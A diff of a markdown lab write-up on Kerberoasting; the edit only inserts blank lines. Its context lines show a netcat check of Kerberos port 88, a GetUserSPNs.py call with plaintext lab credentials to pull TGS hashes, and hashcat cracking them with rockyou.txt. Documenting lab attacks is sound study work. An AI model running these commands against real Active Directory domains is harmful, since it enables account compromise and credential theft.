@@ -17,6 +17,7 @@ The objective of this attack was to enumerate and extract Service Principal Name
 
 1. **Kerberos Port Check**
    - Verified that the Kerberos service (port 88) is open on the Domain Controller:
+     
      ```bash
      nc -vz 192.168.10.10 88
      ```
@@ -28,6 +29,7 @@ The objective of this attack was to enumerate and extract Service Principal Name
 3. **SPN Extraction**
    
    - Ran the `GetUserSPNs.py` script from the mpacket toolkit to request SPNs and attempt Kerberos TGS hash extraction:
+     
      ```bash
      python3 GetUserSPNs.py SOC.LAB/labadmin:Root1234! -request
      ```
@@ -36,6 +38,7 @@ The objective of this attack was to enumerate and extract Service Principal Name
 5. **Hash Cracking**
    
    - Cracked the extracted Kerberos TGS hash using hashcat with the rockyou.txt wordlist, saving the results to `cracked.txt`:
+     
      ```bash
      hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt
      ```
